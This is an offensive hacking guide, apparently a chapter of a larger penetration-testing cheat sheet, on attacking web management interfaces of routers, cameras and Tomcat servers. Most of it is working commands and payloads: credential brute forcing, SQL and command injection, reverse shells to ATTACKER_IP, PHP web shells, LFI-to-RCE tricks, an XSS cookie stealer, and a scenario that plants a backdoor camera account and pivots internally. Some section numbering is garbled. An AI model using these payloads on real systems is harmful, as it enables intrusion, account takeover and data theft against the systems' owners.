# 1. HTTP/HTTPS - COMPLETE ATTACK CHAIN <a name="http"></a>

## 1.1 THEORY & BACKGROUND

### What is HTTP/HTTPS?

**HTTP (HyperText Transfer Protocol)**:
- **Protocol**: Application layer, stateless request-response
- **Default Port**: 80/TCP
- **Security**: NO ENCRYPTION - cleartext transmission
- **RFC**: RFC 2616 (HTTP/1.1), RFC 7540 (HTTP/2)

**HTTPS (HTTP Secure)**:
- **Protocol**: HTTP over TLS/SSL
- **Default Port**: 443/TCP
- **Security**: Encrypted communication, server authentication
- **Purpose**: Secure web communications

**Common Use Cases for Remote Management**:
1. Web-based admin interfaces (routers, switches, firewalls)
2. Device management panels (printers, cameras, NAS)
3. Server management (cPanel, Webmin, phpMyAdmin)
1. API endpoints for remote control
5. RESTful management interfaces

---

## 1.2 ENUMERATION PHASE

### 1.2.1 Service Discovery

**Nmap Scanning:**
```bash
# Basic HTTP/HTTPS discovery
nmap -p 80,443,8080,8443 -sV 192.168.1.0/24

# Common web ports
nmap -p 80,443,8000,8008,8080,8088,8443,8888,9000,9090 -sV 192.168.1.0/24

# All ports for web services
nmap -p- -sV 192.168.1.100 | grep -i "http\|ssl\|tls"

# HTTP-specific scripts
nmap -p 80,443,8080 --script http-enum,http-headers,http-methods,http-title 192.168.1.100

# SSL/TLS enumeration
nmap -p 443 --script ssl-enum-ciphers,ssl-cert,ssl-known-key 192.168.1.100

# Detect web applications
nmap -p 80,443 --script http-waf-detect,http-waf-fingerprint 192.168.1.100

# Virtual host discovery
nmap -p 80,443 --script http-vhosts --script-args http-vhosts.domain=example.com 192.168.1.100

# Fast masscan
masscan -p80,443,8080,8443 192.168.1.0/24 --rate=10000
```

**Banner Grabbing & Fingerprinting:**
```bash
# HTTP banner with curl
curl -I http://192.168.1.100

# HTTPS with certificate info
curl -Ik https://192.168.1.100

# All HTTP methods
curl -v -X OPTIONS http://192.168.1.100

# Using netcat (HTTP)
echo -e "HEAD / HTTP/1.1\r\nHost: 192.168.1.100\r\n\r\n" | nc 192.168.1.100 80

# Using openssl (HTTPS)
echo -e "HEAD / HTTP/1.1\r\nHost: 192.168.1.100\r\n\r\n" | openssl s_client -connect 192.168.1.100:443 -quiet

# WhatWeb fingerprinting
whatweb http://192.168.1.100

# Nikto scanning
nikto -h http://192.168.1.100

# Nmap http-title
nmap -p 80,443 --script http-title 192.168.1.0/24
```

**Identifying Management Interfaces:**

Common patterns in titles/responses:
```
"Router Login" → Router web interface
"Switch Configuration" → Network switch
"Web Device Manager" → Generic device
"Webmin" → Linux management
"cPanel" → Hosting control panel
"phpMyAdmin" → Database management
"Printer Status" → Network printer
"Camera Web Client" → IP camera
"NAS Admin" → Network storage
"ESXi" → VMware hypervisor
"iDRAC" → Dell server management
"iLO" → HP server management
```

### 1.2.2 Directory & File Enumeration

**Gobuster:**
```bash
# Basic directory brute force
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak

# With status codes
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,204,301,302,307,401,403

# HTTPS with certificate ignore
gobuster dir -u https://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt -k

# With cookies
gobuster dir -u http://192.168.1.100 -w wordlist.txt -c "session=abc123"

# With custom User-Agent
gobuster dir -u http://192.168.1.100 -w wordlist.txt -a "Mozilla/5.0"

# Recursive
gobuster dir -u http://192.168.1.100 -w wordlist.txt -r

# Threading
gobuster dir -u http://192.168.1.100 -w wordlist.txt -t 50
```

**Dirsearch:**
```bash
# Basic
dirsearch -u http://192.168.1.100

# With extensions
dirsearch -u http://192.168.1.100 -e php,html,js,txt,bak

# Custom wordlist
dirsearch -u http://192.168.1.100 -w /path/to/wordlist.txt

# Multiple URLs
dirsearch -l urls.txt

# Recursive
dirsearch -u http://192.168.1.100 -r

# With authentication
dirsearch -u http://192.168.1.100 --auth=user:password
```

**ffuf:**
```bash
# Directory fuzzing
ffuf -u http://192.168.1.100/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Extension fuzzing
ffuf -u http://192.168.1.100/index.FUZZ -w extensions.txt

# POST parameter fuzzing
ffuf -u http://192.168.1.100/login -X POST -d "username=admin&password=FUZZ" -w passwords.txt

# Header fuzzing
ffuf -u http://192.168.1.100 -H "X-Custom: FUZZ" -w values.txt

# Virtual host fuzzing
ffuf -u http://192.168.1.100 -H "Host: FUZZ.example.com" -w subdomains.txt

# Filter by response size
ffuf -u http://192.168.1.100/FUZZ -w wordlist.txt -fs 4242

# Multiple filters
ffuf -u http://192.168.1.100/FUZZ -w wordlist.txt -mc 200,301,302 -fs 0 -fw 1
```

**Feroxbuster:**
```bash
# Recursive directory discovery
feroxbuster -u http://192.168.1.100

# With custom depth
feroxbuster -u http://192.168.1.100 --depth 4

# With extensions
feroxbuster -u http://192.168.1.100 -x php,html,txt

# Extract links
feroxbuster -u http://192.168.1.100 --extract-links
```

**Common Admin Paths to Check:**
```bash
# Create custom wordlist
cat > admin_paths.txt << EOF
/admin
/administrator
/admin.php
/admin.html
/login
/login.php
/manager
/management
/console
/phpmyadmin
/cpanel
/webmin
/dashboard
/config
/configuration
/setup
/install
/api
/api/v1
/api/v2
/swagger
/graphql
/backup
/backups
/db
/database
/mysql
/sql
/.git
/.svn
/.env
/robots.txt
/sitemap.xml
/.well-known
EOF

gobuster dir -u http://192.168.1.100 -w admin_paths.txt
```

### 1.2.3 SSL/TLS Enumeration & Exploitation

**SSLScan:**
```bash
# Basic SSL scan
sslscan 192.168.1.100:443

# Show all ciphers
sslscan --show-ciphers 192.168.1.100:443

# Check for specific vulnerabilities
sslscan --no-failed 192.168.1.100:443
```

**testssl.sh:**
```bash
# Comprehensive SSL/TLS testing
./testssl.sh https://192.168.1.100

# Specific vulnerability checks
./testssl.sh --heartbleed --ccs-injection --ticketbleed --robot https://192.168.1.100

# Check cipher suites
./testssl.sh --protocols --ciphers https://192.168.1.100

# Server preferences
./testssl.sh --server-preference https://192.168.1.100

# JSON output
./testssl.sh --json https://192.168.1.100 -oJ results.json
```

**Nmap SSL Scripts:**
```bash
# All SSL scripts
nmap -p 443 --script ssl-* 192.168.1.100

# Heartbleed
nmap -p 443 --script ssl-heartbleed 192.168.1.100

# CCS Injection
nmap -p 443 --script ssl-ccs-injection 192.168.1.100

# POODLE
nmap -p 443 --script ssl-poodle 192.168.1.100

# Certificate information
nmap -p 443 --script ssl-cert 192.168.1.100

# Weak ciphers
nmap -p 443 --script ssl-enum-ciphers 192.168.1.100
```

**SSL Vulnerabilities to Check:**
```bash
# Heartbleed (CVE-2014-0160)
nmap -p 443 --script ssl-heartbleed 192.168.1.100

# POODLE (CVE-2014-3566)
# Test if SSLv3 is enabled
openssl s_client -connect 192.168.1.100:443 -ssl3

# BEAST (CVE-2011-3389)
# Check for TLS 1.0 with CBC ciphers
testssl.sh --beast https://192.168.1.100

# CRIME (CVE-2012-4929)
# Check if compression is enabled
openssl s_client -connect 192.168.1.100:443 | grep Compression

# FREAK (CVE-2015-0204)
testssl.sh --freak https://192.168.1.100

# Logjam (CVE-2015-4000)
testssl.sh --logjam https://192.168.1.100

# DROWN (CVE-2016-0800)
testssl.sh --drown https://192.168.1.100

# ROBOT
testssl.sh --robot https://192.168.1.100
```

---

## 1.3 EXPLOITATION PHASE

### 1.3.1 Default Credentials

**Common Web Interface Default Credentials:**

Routers:
```
admin:admin
admin:password
admin:
root:root
root:admin
user:user
admin:1234
```

Switches:
```
admin:admin
Admin:
manager:friend
root:
cisco:cisco
```

Cameras/DVR:
```
admin:12345
admin:password
admin:admin
root:12345
admin:
666666
888888
123456
```

Management Tools:
```
Webmin: root:password, admin:admin
cPanel: root:root
phpMyAdmin: root:, root:root
Tomcat: tomcat:tomcat, admin:admin
```

**Automated Testing:**
```bash
# Using Hydra for web forms
hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# For HTTP Basic Auth
hydra -L users.txt -P passwords.txt 192.168.1.100 http-get /admin

# Using Burp Intruder
# Capture login request in Burp
# Send to Intruder
# Set payload positions on username and password fields
# Load wordlists
# Start attack

# Using Medusa
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M web-form -m FORM:"/login.php" -m DENY-SIGNAL:"incorrect" -m FORM-DATA:"username=&password="

# Custom script
#!/bin/bash
while IFS=: read user pass; do
    response=$(curl -s -d "username=$user&password=$pass" http://192.168.1.100/login.php)
    if ! echo "$response" | grep -q "incorrect"; then
        echo "[+] Found: $user:$pass"
    fi
done < creds.txt
```

### 1.3.2 Authentication Bypass

**Common Bypasses:**

**A. SQL Injection in Login:**
```bash
# Username field payloads:
admin' --
admin' #
admin'/*
' or '1'='1' --
' or '1'='1' #
admin' or '1'='1
') or '1'='1' --
admin') or ('1'='1

# Test with curl:
curl -X POST http://192.168.1.100/login.php -d "username=admin' or '1'='1' --&password=anything"

# Using sqlmap:
sqlmap -u "http://192.168.1.100/login.php" --data="username=admin&password=test" --level=5 --risk=3 --batch
```

**B. Directory Traversal:**
```bash
# Access admin panel without auth:
http://192.168.1.100/admin
# Returns 401/403

# Try traversal:
http://192.168.1.100/./admin
http://192.168.1.100/../admin
http://192.168.1.100/;/admin
http://192.168.1.100/admin/
http://192.168.1.100//admin
http://192.168.1.100/%2e/admin
http://192.168.1.100/admin..;/
```

**C. HTTP Verb Tampering:**
```bash
# If GET is blocked:
curl -X POST http://192.168.1.100/admin
curl -X PUT http://192.168.1.100/admin
curl -X DELETE http://192.168.1.100/admin
curl -X OPTIONS http://192.168.1.100/admin
curl -X TRACE http://192.168.1.100/admin

# Arbitrary verbs:
curl -X JEFF http://192.168.1.100/admin
```

**D. Header Manipulation:**
```bash
# X-Forwarded-For bypass:
curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.1.100/admin
curl -H "X-Forwarded-For: localhost" http://192.168.1.100/admin

# X-Original-URL / X-Rewrite-URL:
curl -H "X-Original-URL: /admin" http://192.168.1.100/anything
curl -H "X-Rewrite-URL: /admin" http://192.168.1.100/anything

# Custom headers:
curl -H "X-Custom-IP-Authorization: 127.0.0.1" http://192.168.1.100/admin
curl -H "X-Originating-IP: 127.0.0.1" http://192.168.1.100/admin
curl -H "X-Remote-IP: 127.0.0.1" http://192.168.1.100/admin
curl -H "X-Client-IP: 127.0.0.1" http://192.168.1.100/admin
```

**E. Parameter Pollution:**
```bash
# Add admin parameter:
http://192.168.1.100/profile?user=victim&admin=true
http://192.168.1.100/api/user?id=1&id=2
http://192.168.1.100/login?redirect=/admin&redirect=/user

# HPP in POST:
curl -X POST http://192.168.1.100/api -d "role=user&role=admin"
```

**F. Cookie Manipulation:**
```bash
# Decode and modify cookies:
# Example cookie: auth=dXNlcjpub3JtYWw=
echo "dXNlcjpub3JtYWw=" | base64 -d
# Output: user:normal

# Modify:
echo "admin:admin" | base64
# Output: YWRtaW46YWRtaW4=

# Send with curl:
curl -H "Cookie: auth=YWRtaW46YWRtaW4=" http://192.168.1.100/admin

# Other common cookie modifications:
Cookie: admin=true
Cookie: isAdmin=1
Cookie: role=administrator
Cookie: privilege=15
```

### 1.3.3 Remote Code Execution

**A. Command Injection:**

Test inputs:
```bash
# Ping parameter example:
http://192.168.1.100/ping.php?ip=127.0.0.1

# Injection payloads:
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 & id
127.0.0.1 && id
127.0.0.1 || id
`id`
$(id)
127.0.0.1%0aid
127.0.0.1%0did

# Full exploitation:
# Check if command injection works:
curl "http://192.168.1.100/ping.php?ip=127.0.0.1;id"

# Reverse shell:
# Start listener:
nc -lvnp 4444

# Inject reverse shell:
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# URL encode and inject:
curl "http://192.168.1.100/ping.php?ip=127.0.0.1;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261"
```

**B. File Upload RCE:**

```bash
# Upload PHP shell:
<?php system($_GET['cmd']); ?>

# Save as shell.php, upload through web interface

# Access:
http://192.168.1.100/uploads/shell.php?cmd=id

# Bypass upload filters:
# Double extensions:
shell.php.jpg
shell.jpg.php

# Null byte:
shell.php%00.jpg

# Content-Type manipulation:
# Change Content-Type to image/jpeg but upload .php

# Using Burp:
# 1. Capture upload request
# 2. Change filename to shell.php
# 3. Change Content-Type to match allowed type
# 1. Forward request

# Full web shell:
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

# Upload and access:
http://192.168.1.100/uploads/shell.php?cmd=whoami
```

**C. Unrestricted File Upload → RCE:**

```bash
# Create PHP reverse shell:
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.php

# Or use pentestmonkey PHP reverse shell:
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
# Edit and set $ip and $port

# Upload via web interface or curl:
curl -X POST -F "file=@shell.php" http://192.168.1.100/upload.php

# Start listener:
nc -lvnp 4444

# Trigger shell:
curl http://192.168.1.100/uploads/shell.php
```

**D. Local File Inclusion (LFI) → RCE:**

```bash
# Basic LFI test:
http://192.168.1.100/index.php?page=../../../../etc/passwd

# Read sensitive files:
http://192.168.1.100/index.php?page=../../../../etc/shadow
http://192.168.1.100/index.php?page=../../../../root/.ssh/id_rsa
http://192.168.1.100/index.php?page=../../../../var/www/html/config.php

# LFI to RCE via log poisoning:
# 1. Poison access log:
curl -A "<?php system(\$_GET['cmd']); ?>" http://192.168.1.100/

# 2. Include log file:
http://192.168.1.100/index.php?page=../../../../var/log/apache2/access.log&cmd=id

# LFI to RCE via /proc/self/environ:
# 1. Poison User-Agent in /proc/self/environ:
curl -A "<?php system('id'); ?>" http://192.168.1.100/

# 2. Include environ:
http://192.168.1.100/index.php?page=../../../../proc/self/environ

# LFI to RCE via PHP session:
# 1. Create session with PHP code:
curl -s "http://192.168.1.100/index.php" -H "Cookie: PHPSESSID=malicious" --data "name=<?php system('id'); ?>"

# 2. Find session file:
http://192.168.1.100/index.php?page=../../../../var/lib/php/sessions/sess_malicious

# LFI to RCE via data wrapper:
http://192.168.1.100/index.php?page=data://text/plain,<?php system('id'); ?>
http://192.168.1.100/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# LFI to RCE via expect wrapper:
http://192.168.1.100/index.php?page=expect://id

# LFI to RCE via input wrapper:
curl -s "http://192.168.1.100/index.php?page=php://input" --data "<?php system('id'); ?>"
```

### 1.3.4 API Exploitation

**REST API Attacks:**

```bash
# Enumerate API endpoints:
gobuster dir -u http://192.168.1.100/api -w /usr/share/wordlists/dirb/common.txt -x json

# Common API paths:
/api/v1/users
/api/v2/config
/api/admin
/api/status
/api/settings

# Test authentication:
curl -X GET http://192.168.1.100/api/users
# If 401: requires auth
# If 403: authenticated but not authorized
# If 200: no auth required!

# Test IDOR:
curl http://192.168.1.100/api/user/1
curl http://192.168.1.100/api/user/2
# Try accessing other users' data

# Test mass assignment:
# Create user:
curl -X POST http://192.168.1.100/api/users -d '{"username":"test","password":"test"}'
# Try adding admin field:
curl -X POST http://192.168.1.100/api/users -d '{"username":"test","password":"test","isAdmin":true}'

# Test HTTP verbs:
curl -X GET http://192.168.1.100/api/users/1
curl -X PUT http://192.168.1.100/api/users/1 -d '{"role":"admin"}'
curl -X DELETE http://192.168.1.100/api/users/2
curl -X PATCH http://192.168.1.100/api/users/1 -d '{"password":"hacked"}'

# Test GraphQL:
curl -X POST http://192.168.1.100/graphql -H "Content-Type: application/json" -d '{"query":"{ users { id username email } }"}'

# GraphQL introspection:
curl -X POST http://192.168.1.100/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'

# API key bypass:
curl http://192.168.1.100/api/secret -H "X-API-Key: "
curl http://192.168.1.100/api/secret -H "X-API-Key: null"
curl http://192.168.1.100/api/secret -H "X-API-Key: []"
```

### 1.3.5 Session Hijacking

**A. Session Fixation:**
```bash
# 1. Get a session ID:
curl -c cookies.txt http://192.168.1.100/login.php
cat cookies.txt
# Output: PHPSESSID=abc123

# 2. Send victim link with fixed session:
http://192.168.1.100/login.php?PHPSESSID=abc123

# 3. Wait for victim to login

# 1. Use the same session:
curl -b "PHPSESSID=abc123" http://192.168.1.100/admin
```

**B. Session Prediction:**
```bash
# Collect multiple session IDs:
for i in {1..100}; do
    curl -c - http://192.168.1.100/ | grep PHPSESSID >> sessions.txt
done

# Analyze for patterns:
cat sessions.txt
# If sessions are sequential or predictable, generate next values

# Example: MD5-based sessions
# If pattern found, generate valid sessions:
echo -n "user_1" | md5sum
# Use generated session:
curl -b "PHPSESSID=generated_hash" http://192.168.1.100/admin
```

**C. XSS to Steal Sessions:**
```bash
# Setup cookie stealer:
# On attacker server, create steal.php:
<?php
$cookie = $_GET['c'];
file_put_contents('cookies.txt', $cookie . "\n", FILE_APPEND);
?>

# XSS payload:
<script>document.location='http://ATTACKER_IP/steal.php?c='+document.cookie;</script>

# URL encoded:
%3Cscript%3Edocument.location%3D%27http%3A%2F%2FATTACKER_IP%2Fsteal.php%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E

# Inject in vulnerable parameter:
http://192.168.1.100/search.php?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2FATTACKER_IP%2Fsteal.php%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E

# Victim clicks link, cookie sent to attacker

# Use stolen cookie:
curl -b "PHPSESSID=stolen_session_id" http://192.168.1.100/admin
```

---

## 1.4 POST-EXPLOITATION

### 1.1.1 Web Shell Management

**Upload and Use Web Shells:**

```bash
# Simple PHP web shell:
<?php system($_GET['cmd']); ?>

# Feature-rich web shells:
# Download p0wny-shell:
wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

# Download WSO shell:
wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php

# Upload and access:
http://192.168.1.100/uploads/shell.php?cmd=id
http://192.168.1.100/uploads/p0wny-shell.php

# Using weevely (encrypted PHP shell):
weevely generate password shell.php
# Upload shell.php
weevely http://192.168.1.100/shell.php password
```

**Web Shell Commands:**
```bash
# From web shell interface (p0wny or custom):

# System info:
uname -a
cat /etc/issue
hostname

# User info:
id
whoami
cat /etc/passwd

# Network info:
ifconfig
ip addr
netstat -tulpn
arp -a

# File operations:
ls -la /var/www/html
cat /var/www/html/config.php
find / -name "config*" 2>/dev/null

# Download database:
mysqldump -u root -p database_name > /tmp/db.sql
# Serve via web:
cp /tmp/db.sql /var/www/html/backup.sql
# Download:
wget http://192.168.1.100/backup.sql

# Privilege escalation:
sudo -l
find / -perm -4000 2>/dev/null
```

### 1.1.2 Pivoting from Web Server

**Internal Network Access:**
```bash
# From web shell, enumerate internal network:
# Create script upload.php on web server:
<?php
$ip = $_GET['ip'];
$port = $_GET['port'];
$timeout = 1;

$sock = fsockopen($ip, $port, $errno, $errstr, $timeout);
if ($sock) {
    echo "Port $port is open on $ip";
    fclose($sock);
} else {
    echo "Port $port is closed on $ip";
}
?>

# Scan internal network:
for ip in 192.168.100.{1..254}; do
    curl "http://192.168.1.100/upload.php?ip=$ip&port=22"
done

# Pivot via SOCKS proxy:
# On compromised web server (if you have shell access):
ssh -R 9050 attacker@attacker_ip

# On attacker machine:
# Edit /etc/proxychains.conf:
# socks4 127.0.0.1 9050

# Access internal resources:
proxychains curl http://192.168.100.50
proxychains nmap -sT -Pn 192.168.100.0/24
```

---

## 1.5 COMPLETE ATTACK SCENARIO

**Scenario: Compromising Network via Web Management Interface**

**Phase 1: Discovery**
```bash
# Scan for web services:
nmap -p 80,443,8080,8443 --open 192.168.1.0/24 -oG web_services.txt

# Results:
# 192.168.1.10:80 - Apache (Router web interface)
# 192.168.1.50:443 - HTTPS (Camera system)
# 192.168.1.100:8080 - Tomcat (Application server)

# Identify applications:
whatweb http://192.168.1.10
# Output: "D-Link Router Login"

curl -Ik https://192.168.1.50
# Output: "Hikvision Web Server"

curl http://192.168.1.100:8080
# Output: "Apache Tomcat/7.0.52"
```

**Phase 2: Exploitation - Router**
```bash
# Try default credentials on router:
curl -u admin:admin http://192.168.1.10/admin
# Success! Access granted

# Or if form-based:
curl -X POST -d "username=admin&password=admin" http://192.168.1.10/login.php
# Session cookie returned

# Extract configuration:
curl -u admin:admin http://192.168.1.10/config.xml > router_config.xml

# Found WiFi password in config:
cat router_config.xml | grep -i "wpa"
# <wpa_psk>SuperSecret123!</wpa_psk>
```

**Phase 3: Exploitation - Camera**
```bash
# Try default Hikvision credentials:
curl -u admin:12345 https://192.168.1.50/ISAPI/Security/users -k
# Access granted!

# Create backdoor admin account:
curl -u admin:12345 -X PUT https://192.168.1.50/ISAPI/Security/users/2 -k -d '
<User>
    <id>2</id>
    <userName>backdoor</userName>
    <password>Backdoor123!</password>
    <userLevel>Administrator</userLevel>
</User>'

# Access camera stream:
ffplay rtsp://backdoor:Backdoor123!@192.168.1.50:554/Streaming/Channels/101
```

**Phase 4: Exploitation - Tomcat**
```bash
# Try default Tomcat credentials:
curl -u tomcat:tomcat http://192.168.1.100:8080/manager/text/list
# Success!

# Deploy malicious WAR file:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > shell.war

# Upload:
curl -u tomcat:tomcat --upload-file shell.war "http://192.168.1.100:8080/manager/text/deploy?path=/shell"

# Start listener:
nc -lvnp 4444

# Trigger shell:
curl http://192.168.1.100:8080/shell/
# Reverse shell received!

# On the shell:
whoami
# Output: tomcat

# Upgrade shell:
python -c 'import pty;pty.spawn("/bin/bash")'

# Enumerate:
cat /etc/passwd
# Found: admin, root, tomcat

# Check for sudo:
sudo -l
# Output: (ALL) NOPASSWD: /bin/systemctl

# Privilege escalation:
sudo systemctl
!sh
# Root shell!
```

**Phase 5: Lateral Movement**
```bash
# On compromised Tomcat server, scan internal network:
nmap -sT -Pn 192.168.100.0/24
# Found:
# 192.168.100.10 - Windows Server (RDP)
# 192.168.100.50 - SQL Server

# Setup SOCKS proxy:
# On compromised server:
ssh -R 9050 attacker@attacker_server

# On attacker:
proxychains rdesktop 192.168.100.10
# Try previously found credentials

# Access SQL Server:
proxychains mssqlclient.py sa@192.168.100.50
# Enumerate databases and extract data
```

---